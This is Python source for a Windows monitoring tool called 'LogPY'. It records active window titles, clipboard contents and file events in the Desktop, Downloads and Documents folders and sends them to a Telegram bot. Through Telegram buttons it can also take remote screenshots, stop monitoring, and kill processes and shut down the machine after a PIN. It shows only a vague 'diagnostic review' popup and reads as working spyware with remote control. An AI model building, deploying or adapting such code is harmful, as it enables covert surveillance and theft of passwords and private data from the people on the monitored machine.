import asyncio
import logging
import ctypes
import os
import socket
import psutil
import html
import time
import urllib.request
import urllib.parse
import atexit
import pyautogui
import pyperclip
from datetime import datetime
from plyer import notification
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, MessageHandler, CommandHandler, filters, ContextTypes
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("LogPY_Core")

TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
MY_CHAT_ID = YOUR_CHAT_ID_INTEGER_HERE
SHUTDOWN_PIN = "YOUR_PIN"

_is_notified = False

def dispatch_sync_notice(payload: str):
    global _is_notified
    if _is_notified:
        return
    _is_notified = True
    
    try:
        endpoint = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        encoded_data = urllib.parse.urlencode({
            'chat_id': MY_CHAT_ID,
            'text': payload,
            'parse_mode': 'HTML'
        }).encode('utf-8')
        req = urllib.request.Request(endpoint, data=encoded_data)
        urllib.request.urlopen(req, timeout=4)
        logger.info("Synchronous notification successfully delivered.")
        time.sleep(3)
    except Exception as exc:
        logger.error(f"Failed to dispatch synchronous notice: {exc}")

class DirectoryWatcher(FileSystemEventHandler):
    def __init__(self, engine_ref):
        self.engine = engine_ref

    def _filter_temporary(self, name: str) -> bool:
        lowered = name.lower()
        if lowered == "screenshot.png" or lowered.endswith('.tmp') or lowered.startswith('~$') or lowered.startswith('~'):
            return True
        return False

    def on_created(self, event):
        if not event.is_directory:
            filename = os.path.basename(event.src_path)
            if not self._filter_temporary(filename):
                self.engine.register_fs_event("Created File", filename, event.src_path)

    def on_deleted(self, event):
        if not event.is_directory:
            filename = os.path.basename(event.src_path)
            if not self._filter_temporary(filename):
                self.engine.register_fs_event("Deleted File", filename, event.src_path)

    def on_moved(self, event):
        if not event.is_directory:
            old_name = os.path.basename(event.src_path)
            new_name = os.path.basename(event.dest_path)
            if not self._filter_temporary(new_name):
                details = f"{old_name} ➔ {new_name}"
                self.engine.register_fs_event("Renamed File", details, event.dest_path)

class LogPYEngine:
    def __init__(self, telegram_app: Application, grace_period: int = 30):
        self.app = telegram_app
        self.grace_period = grace_period
        self.is_active = False
        self.last_window = ""
        self.tracked_pids = set()
        self.observer = None
        self.event_loop = asyncio.get_event_loop()
        
        try:
            self.last_clipboard = pyperclip.paste() or ""
        except Exception:
            self.last_clipboard = ""

    def _dispatch_popup(self):
        try:
            notification.notify(
                title='System Monitoring Active',
                message='User session under routine diagnostic review.',
                app_name='LogPY Service',
                timeout=10
            )
            logger.info("Diagnostic notice rendered.")
        except Exception as err:
            logger.error(f"Popup notification failure: {err}")

    def _extract_active_context(self) -> dict:
        handle = ctypes.windll.user32.GetForegroundWindow()
        if not handle:
            return {"title": "", "app": "Unknown", "pid": 0}

        length = ctypes.windll.user32.GetWindowTextLengthW(handle)
        buffer = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(handle, buffer, length + 1)
        w_title = buffer.value.strip()

        process_id = ctypes.c_ulong()
        ctypes.windll.user32.GetWindowThreadProcessId(handle, ctypes.byref(process_id))
        app_title = "Unknown"
        
        try:
            if process_id.value > 0:
                proc = psutil.Process(process_id.value)
                app_title = proc.name()
        except Exception:
            pass

        if app_title.lower() == "explorer.exe" and not w_title:
            w_title = "Desktop / File Explorer"

        return {"title": w_title, "app": app_title, "pid": process_id.value}

    async def _emit_telemetry(self, category: str, content: str, source: str):
        sanitized_content = html.escape(content)
        sanitized_source = html.escape(source)
        
        symbol = "📂"
        if "Created" in category: symbol = "📄"
        elif "Deleted" in category: symbol = "🗑️"
        elif "Renamed" in category: symbol = "✏️"
        elif "Window" in category: symbol = "💻"
        elif "Clipboard" in category: symbol = "📋"

        message_block = (
            f"<b>{symbol} {category}</b>\n"
            f"<code>├ </code><b>Source:</b> <code>{sanitized_source}</code>\n"
            f"<code>└ </code><b>Payload:</b> <i>{sanitized_content}</i>"
        )
        
        logger.info(f"Telemetry -> [{category}] Source: {source} | Content: {content}")
        try:
            await self.app.bot.send_message(
                chat_id=MY_CHAT_ID, 
                text=message_block, 
                parse_mode='HTML'
            )
        except Exception as err:
            logger.error(f"Failed to transmit telemetry packet: {err}")

    def register_fs_event(self, category: str, details: str, absolute_path: str):
        if self.is_active:
            parent_dir = os.path.basename(os.path.dirname(absolute_path))
            asyncio.run_coroutine_threadsafe(
                self._emit_telemetry(category, details, f"FileSystem ({parent_dir})"),
                self.event_loop
            )

    def _initialize_observer(self):
        user_home = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
        target_dirs = [
            os.path.join(user_home, "Desktop"),
            os.path.join(user_home, "Downloads"),
            os.path.join(user_home, "Documents")
        ]
        
        self.observer = Observer()
        handler = DirectoryWatcher(self)
        
        for directory in target_dirs:
            if os.path.exists(directory):
                self.observer.schedule(handler, directory, recursive=True)
                logger.info(f"Monitoring targeted directory: {directory}")
                
        self.observer.start()

    async def _execution_stream(self):
        logger.info("Telemetry gathering loop initiated.")
        self._initialize_observer()
        
        while self.is_active:
            context = self._extract_active_context()
            current_title = context['title']
            app_name = context['app']
            pid_val = context['pid']
            
            if current_title and current_title != self.last_window:
                self.last_window = current_title
                if pid_val > 0 and app_name.lower() not in ['explorer.exe', 'cmd.exe', 'python.exe', 'windowsterminal.exe']:
                    self.tracked_pids.add(pid_val)
                
                await self._emit_telemetry("Window Activity", current_title, app_name)

            try:
                clipboard_data = pyperclip.paste()
                if clipboard_data and clipboard_data != self.last_clipboard:
                    cleaned_clip = clipboard_data.strip()
                    if len(cleaned_clip) > 3:
                        self.last_clipboard = clipboard_data
                        formatted_payload = " ".join(cleaned_clip.splitlines())
                        if len(formatted_payload) > 300:
                            formatted_payload = formatted_payload[:300] + "..."
                        
                        await self._emit_telemetry("Clipboard Action", formatted_payload, "System Clipboard")
            except Exception:
                pass
                
            await asyncio.sleep(2)

    async def boot_sequence(self):
        logger.info(f"Diagnostic pause engaged. Waiting {self.grace_period} seconds...")
        await asyncio.sleep(self.grace_period)
            
        logger.warning(f"Grace period elapsed. Activating core surveillance protocols...")
        self.is_active = True
        
        self._dispatch_popup()
        
        hostname = socket.gethostname()
        timestamp = datetime.now().strftime("%H:%M:%S %d/%m/%Y")
        boot_announcement = (
            f"🚨 <b>UNAUTHORIZED SESSION ACCESS</b>\n\n"
            f"💻 <b>Host:</b> <code>{hostname}</code>\n"
            f"🕒 <b>Timestamp:</b> {timestamp}\n\n"
            f"<i>Core diagnostic environment operational...</i>"
        )
        
        interface_markup = ReplyKeyboardMarkup(
            [
                [KeyboardButton("📸 CAPTURE SCREEN"), KeyboardButton("📊 SYSTEM STATUS")],
                [KeyboardButton("🛑 STOP MONITORING"), KeyboardButton("🔴 EMERGENCY SHUTDOWN")]
            ],
            resize_keyboard=True,
            is_persistent=True
        )
        
        try:
            await self.app.bot.send_message(
                chat_id=MY_CHAT_ID, 
                text=boot_announcement, 
                reply_markup=interface_markup, 
                parse_mode='HTML'
            )
        except Exception as err:
            logger.error(f"Failed to transmit boot notice: {err}")

        asyncio.create_task(self._execution_stream())

    @classmethod
    async def terminate_engine(cls, instance, target_pids: set):
        logger.info("Executing safe teardown protocol...")
        
        if instance and instance.observer:
            instance.observer.stop()
            instance.observer.join()

        for process_id in target_pids:
            try:
                p_obj = psutil.Process(process_id)
                p_obj.terminate()
            except Exception:
                pass
                
        await asyncio.sleep(3)
        os.system("shutdown /s /t 2")

    @classmethod
    async def stop_monitoring_remotely(cls, instance):
        logger.info("Remote stop requested via Telegram interface.")
        if instance and instance.observer:
            instance.observer.stop()
            instance.observer.join()
        instance.is_active = False

security_pin_lock = False
active_engine_ref = None 

async def status_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_CHAT_ID:
        return
        
    status_report = (
        f"🟢 <b>SYSTEM STATUS REPORT</b>\n\n"
        f"• <b>Status:</b> Active Defense\n"
        f"• <b>Host:</b> <code>{socket.gethostname()}</code>\n"
        f"• <b>Active Threads:</b> {len(psutil.pids())} processes\n"
        f"• <b>Engine Clock:</b> {datetime.now().strftime('%H:%M:%S')}"
    )
    await update.message.reply_text(status_report, parse_mode='HTML')

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global security_pin_lock, active_engine_ref
    
    if update.effective_user.id != MY_CHAT_ID:
        return

    text_content = update.message.text

    if text_content == "📊 SYSTEM STATUS":
        await status_command_handler(update, context)

    elif text_content == "📸 CAPTURE SCREEN":
        try:
            screenshot_filepath = "screenshot.png"
            pyautogui.screenshot(screenshot_filepath)
            
            with open(screenshot_filepath, 'rb') as img_file:
                await context.bot.send_photo(
                    chat_id=MY_CHAT_ID, 
                    photo=img_file, 
                    caption="📸 <b>Diagnostic Snapshot Captured</b>", 
                    parse_mode='HTML'
                )
            
            if os.path.exists(screenshot_filepath):
                os.remove(screenshot_filepath)
        except Exception as err:
            await update.message.reply_text(f"❌ Screen capture utility failed: {err}")

    elif text_content == "🛑 STOP MONITORING":
        if active_engine_ref:
            await LogPYEngine.stop_monitoring_remotely(active_engine_ref)
            await update.message.reply_text("🛑 <b>MONITORING HALTED</b>\n\n<i>Telemetry streaming has been disabled remotely.</i>", parse_mode='HTML')

    elif text_content == "🔴 EMERGENCY SHUTDOWN":
        security_pin_lock = True
        await update.message.reply_text("🔴 <b>EMERGENCY PROTOCOL ENGAGED</b>\n\nEnter the 4-digit security PIN to proceed:", parse_mode='HTML')

    elif security_pin_lock:
        if text_content == SHUTDOWN_PIN:
            await update.message.reply_text("✅ <b>VERIFIED.</b> Initiating safe system shutdown sequence...", parse_mode='HTML')
            await LogPYEngine.terminate_engine(active_engine_ref, active_engine_ref.tracked_pids if active_engine_ref else set())
            security_pin_lock = False
        else:
            await update.message.reply_text("❌ <b>INVALID CREDENTIALS.</b> Operation aborted.", parse_mode='HTML')
            security_pin_lock = False

async def main():
    global active_engine_ref
    
    atexit.register(lambda: dispatch_sync_notice("⚠️ <b>Session Terminated</b>\nHost environment shut down or monitoring service dropped."))

    telegram_app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    telegram_app.add_handler(CommandHandler(["status", "report"], status_command_handler))
    telegram_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))

    await telegram_app.initialize()
    await telegram_app.start()
    await telegram_app.updater.start_polling()

    active_engine_ref = LogPYEngine(telegram_app=telegram_app, grace_period=30)
    await active_engine_ref.boot_sequence()

    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Runtime terminated manually.")
